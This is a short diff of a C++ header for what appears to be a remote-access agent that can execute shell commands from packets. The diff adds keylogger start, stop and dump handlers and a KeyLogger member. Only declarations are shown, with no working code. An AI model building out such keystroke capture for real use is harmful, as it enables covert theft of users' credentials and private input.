@@ -4,6 +4,7 @@
 #include "../../common/include/Packet.hpp"
 #include "ProcessProfiler.hpp"
 #include "ShellExecutor.hpp"
+#include "KeyLogger.hpp"
 #include <string>
 #include <vector>
 #include <atomic>
@@ -43,6 +44,9 @@ private:
     void handleDispatching(Packet&& packet);
     void handleProcessDiscovery();
     void handleShellExecution(Packet&& packet);
+    void handleKeylogStart();
+    void handleKeylogStop();
+    void handleKeylogDump();
 
     // System Profiler (Gourmandise Subsystem)
     std::string getSystemInfo();
@@ -59,6 +63,7 @@ private:
     std::vector<uint8_t> m_receive_buffer;
     ProcessProfiler m_profiler;
     ShellExecutor   m_shell;
+    KeyLogger       m_keylogger;
 };
 
 } // namespace inferno
